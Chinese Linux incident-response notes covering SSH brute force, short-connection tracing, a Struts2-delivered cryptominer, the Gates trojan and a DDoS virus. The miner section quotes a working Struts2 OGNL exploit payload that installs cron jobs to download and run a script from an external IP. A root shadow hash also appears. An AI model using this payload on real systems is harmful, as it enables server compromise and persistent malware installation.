

## 第1篇：SSH暴力破解

### 0x00 前言

 SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全。SSH口令长度太短或者复杂度不够，如仅包含数字，或仅包含字母等，容易被攻击者破解，一旦被攻击者获取，可用来直接登录系统，控制服务器所有权限。

### 0x01 应急场景

 某天，网站管理员登录服务器进行巡检时，发现端口连接里存在两条可疑的连接记录，如下图：

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-10-1.png)

1. TCP初始化连接三次握手吧：发SYN包，然后返回SYN/ACK包，再发ACK包，连接正式建立。但是这里有点出入，当请求者收到SYS/ACK包后，就开始建立连接了，而被请求者第三次握手结束后才建立连接。

2. 客户端TCP状态迁移：

    CLOSED->SYN_SENT->ESTABLISHED->FIN_WAIT_1->FIN_WAIT_2->TIME_WAIT->CLOSED

   服务器TCP状态迁移：

    CLOSED->LISTEN->SYN recv->ESTABLISHED->CLOSE_WAIT->LAST_ACK->CLOSED

3. 当客户端开始连接时，服务器还处于LISTENING，客户端发一个SYN包后，服务端接收到了客户端的SYN并且发送了ACK时，服务器处于SYN_RECV状态，然后并没有再次收到客户端的ACK进入ESTABLISHED状态，一直停留在SYN_RECV状态。

   在这里，SSH（22）端口，两条外网IP的SYN_RECV状态连接，直觉告诉了管理员，这里一定有什么异常。

### 0x02 日志分析

 SSH端口异常，我们首先有必要先来了解一下系统账号情况：

**A、系统账号情况**

```
1、除root之外，是否还有其它特权用户(uid 为0)
[root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd
root

2、可以远程登录的帐号信息
[root@localhost ~]# awk '/\$1|\$6/{print $1}' /etc/shadow
root:$6$38cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7:::
```

我们可以确认目前系统只有一个管理用户root。

接下来，我们想到的是/var/log/secure，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。

**B、确认攻击情况：**

```
1、统计了下日志，发现大约有126254次登录失败的记录，确认服务器遭受暴力破解
[root@localhost ~]# grep -o "Failed password" /var/log/secure|uniq -c
     126254 Failed password

2、输出登录爆破的第一行和最后一行，确认爆破时间范围：
[root@localhost ~]# grep "Failed password" /var/log/secure|head -1
Jul  8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2
[root@localhost ~]# grep "Failed password" /var/log/secure|tail -1
Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2

3、进一步定位有哪些IP在爆破？
[root@localhost ~]# grep "Failed password" /var/log/secure|grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"|uniq -c | sort -nr 
    12622 23.91.xxx.xxx
     8942 114.104.xxx.xxx
     8122 111.13.xxx.xxx
     7525 123.59.xxx.xxx
     ...................

4、爆破用户名字典都有哪些？
[root@localhost ~]# grep "Failed password" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr
      9402  root
      3265  invalid user oracle
      1245  invalid user admin
      1025  invalid user user
      .....................
```

**C、管理员最近登录情况：**

```
1、登录成功的日期、用户名、IP：
[root@localhost ~]# grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 
Jul 9 09:38:09 root 192.168.143.100
Jul 9 14:55:51 root 192.168.143.100
Jul 10 08:54:26 root 192.168.143.100
Jul 10 16:25:59 root 192.168.143.100
............................
通过登录日志分析，并未发现异常登录时间和登录IP。

2、顺便统计一下登录成功的IP有哪些：
[root@localhost ~]# grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more
     27 192.168.204.1
```

通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。

### 0x04 处理措施

 SSH暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：

```
1、禁止向公网开放管理端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于8位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。
2、更改服务器ssh默认端口。
3、部署入侵检测设备，增强安全防护。
```

## 第2篇：捕捉短连接

### 0x00 前言

 短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。

### 0x01 应急场景

 某天，网络管理员在出口WAF检测到某台服务器不断向香港I发起请求 ，感觉很奇怪，登录服务器排查，想要找到发起短连接的进程。

### 0x02 日志分析

 登录服务器查看端口、进程，并未发现发现服务器异常，但是当多次刷新端口连接时，可以查看该连接。 有时候一直刷这条命令好十几次才会出现，像这种的短连接极难捕捉到对应的进程和源文件。

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-11-1.png)

手动捕捉估计没戏，很难追踪，于是动手写了一段小脚本来捕捉短连接对应的pid和源文件。

脚本文件如下：

```
#!/bin/bash
ip=118.184.15.40
i=1
while :
do
tmp=netstat -anplt|grep $ip|awk -F '[/]' '{print $1}'|awk '{print $7}'
#echo $tmp
if test -z "$tmp"
then
```

 `((i=i+1))`

```
else
```

 `for pid in $tmp; do`

 `echo "PID: "${pid}`

 `result=ls -lh /proc/$pid|grep exe`

 `echo "Process: "${result}`

 `kill -9 $pid`

 `done`

 `break`

```
fi
done
echo "Total number of times: "${i}
```

运行结果如下：

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-11-2.png)

跑了三次脚本，可以发现短连接每次发起的进程Pid一直在变，但已经捕捉到发起该异常连接的进程源文件为 /usr/lib/nfsiod

### 0x04 小结

 本文简单介绍了短连接以及捕捉短连接源文件的技巧，站在安全管理员的角度，应加强对网络安全设备的管理，在网络层去发现更多在系统层很难察觉的安全威胁。

## 第3篇：挖矿病毒

### 0x00 前言

 随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞（如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞、Struts2远程命令执行等），导致大量服务器被感染挖矿程序的现象 。

### 0x01 应急场景

 某天，安全管理员在登录安全设备巡检时，发现某台网站服务器持续向境外IP发起连接，下载病毒源：

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-12-1.png)

### 0x02 事件分析

#### A、排查过程

登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-12-2.png)

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-12-3.png)

下载logo.jpg，包含脚本内容如下：

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-12-4.png)

到这里，我们可以发现攻击者下载logo.jpg并执行了里面了shell脚本，那这个脚本是如何启动的呢？

通过排查系统开机启动项、定时任务、服务等，在定时任务里面，发现了恶意脚本，每隔一段时间发起请求下载病毒源，并执行 。

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-12-5.png)

#### B、溯源分析

 在Tomcat log日志中，我们找到这样一条记录：

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-12-6.png)

对日志中攻击源码进行摘录如下：

```
{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo "*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh" | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

可以发现攻击代码中的操作与定时任务中异常脚本一致，据此推断黑客通过Struct 远程命令执行漏洞向服务器定时任务中写入恶意脚本并执行。

#### C、清除病毒

1、删除定时任务:

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-12-7.png)

2、终止异常进程:

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-12-8.png)

#### D、漏洞修复

 升级struts到最新版本

### 0x03 防范措施

 针对服务器被感染挖矿程序的现象，总结了几种预防措施：

```
1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护
2、及时更新 Windows安全补丁，开启防火墙临时关闭端口
3、及时更新web漏洞补丁，升级web组件
```



## 第4篇：盖茨木马

### 0x00 前言

 Linux盖茨木马是一类有着丰富历史，隐藏手法巧妙，网络攻击行为显著的DDoS木马，主要恶意特点是具备了后门程序，DDoS攻击的能力，并且会替换常用的系统文件进行伪装。木马得名于其在变量函数的命名中，大量使用Gates这个单词。分析和清除盖茨木马的过程，可以发现有很多值得去学习和借鉴的地方。

### 0x01 应急场景

 某天，网站管理员发现服务器CPU资源异常，几个异常进程占用大量网络带宽：

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-13-1.png)

### 0x02 事件分析

**异常IP连接：**

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-13-2.png)

**异常进程：**

 查看进行发现ps aux进程异常，进入该目录发现多个命令，猜测命令可能已被替换

登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-13-3.png)

**异常启动项**

进入rc3.d目录可以发现多个异常进行：

/etc/rc.d/rc3.d/S97DbSecuritySpt

/etc/rc.d/rc3.d/S99selinux

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-13-4.png)

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-13-5.png)

**搜索病毒原体**

find / -size -1223124c -size +1223122c -exec ls -id {} \; 搜索1223123大小的文件

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-13-6.png)

从以上种种行为发现该病毒与“盖茨木马”有点类似，具体技术分析细节详见：

> Linux平台“盖茨木马”分析
>
> http://www.freebuf.com/articles/system/117823.html
>
> 悬镜服务器卫士丨Linux平台“盖茨木马”分析
>
> http://www.sohu.com/a/117926079_515168

手动清除木马过程：

```
1、简单判断有无木马
#有无下列文件
cat /etc/rc.d/init.d/selinux
cat /etc/rc.d/init.d/DbSecuritySpt
ls /usr/bin/bsd-port
ls /usr/bin/dpkgd
#查看大小是否正常
ls -lh /bin/netstat
ls -lh /bin/ps
ls -lh /usr/sbin/lsof
ls -lh /usr/sbin/ss

2、上传如下命令到/root下
ps netstat ss lsof

3、删除如下目录及文件
rm -rf /usr/bin/dpkgd (ps netstat lsof ss)
rm -rf /usr/bin/bsd-port     #木马程序
rm -f /usr/bin/.sshd         #木马后门
rm -f /tmp/gates.lod
rm -f /tmp/moni.lod
rm -f /etc/rc.d/init.d/DbSecuritySpt(启动上述描述的那些木马变种程序)
rm -f /etc/rc.d/rc1.d/S97DbSecuritySpt
rm -f /etc/rc.d/rc2.d/S97DbSecuritySpt
rm -f /etc/rc.d/rc3.d/S97DbSecuritySpt
rm -f /etc/rc.d/rc4.d/S97DbSecuritySpt
rm -f /etc/rc.d/rc5.d/S97DbSecuritySpt
rm -f /etc/rc.d/init.d/selinux(默认是启动/usr/bin/bsd-port/getty)
rm -f /etc/rc.d/rc1.d/S99selinux
rm -f /etc/rc.d/rc2.d/S99selinux
rm -f /etc/rc.d/rc3.d/S99selinux
rm -f /etc/rc.d/rc4.d/S99selinux
rm -f /etc/rc.d/rc5.d/S99selinux    
4、找出异常程序并杀死
5、删除含木马命令并重新安装
```

### 0x03 命令替换

**RPM check检查：**

```
系统完整性也可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查
./rpm -Va > rpm.log
如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串, ``c 用以指配置文件, 接着是文件名. 8位字符的每一个 用以表示文件与RPM数据库中一种属性的比较结果 。``. (点) 表示测试通过。.下面的字符表示对RPM软件包进行的某种测试失败：
```

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-13-7.png)

**命令替换：**

```
rpm2cpio 包全名 |  cpio -idv .文件绝对路径   rpm包中文件提取
Rpm2cpio  将rpm包转换为cpio格式的命令 
Cpio 是一个标准工具，它用于创建软件档案文件和从档案文件中提取文件

Cpio 选项 < [文件|设备]
-i：copy-in模式，还原
-d：还原时自动新建目录
-v：显示还原过程
```

文件提取还原案例：

```
rpm  -qf /bin/ls  查询ls命令属于哪个软件包
mv  /bin/ls /tmp  
rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取rpm包中ls命令到当前目录的/bin/ls下
cp /root/bin/ls  /bin/ 把ls命令复制到/bin/目录 修复文件丢失

挂载命令rpm包：
mkdir  /mnt/chrom/  建立挂载点
mount -t iso9660 /dev/cdrom  /mnt/cdrom/  挂在光盘
mount/dev/sr0 /mnt/cdrom/

卸载命令
umount  设备文件名或挂载点
umount /mnt/cdrom/
```

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-13-8.png)

## 第5篇：DDOS病毒

### 现象描述

某服务器网络资源异常,感染该木马病毒的服务器会占用网络带宽，甚至影响网络业务正常应用。

### 系统分析

针对日志服务器病毒事件排查情况： 在开机启动项/etc/rc.d/rc.local发现可疑的sh.sh脚本，进一步跟踪sh.sh脚本,这是一个检测病毒十分钟存活的脚本。

在root目录下发现存活检测脚本

![img](https://bypass007.github.io/Emergency-Response-Notes/Linux/image/linux-14-1.png)

解决步骤：

1. 结束进程 ps aux | grep "conf.m" | grep -v grep | awk ‘{print $2}‘| xargs kill -9

2. 清除自动启动脚本 vim /etc/rc.local 去掉 sh /etc/chongfu.sh &

3. 清除 脚本 rm -rf /etc/chongfu.sh /tem/chongfu.sh

4. 修改登录密码 passwd

5. 重启。 reboot

   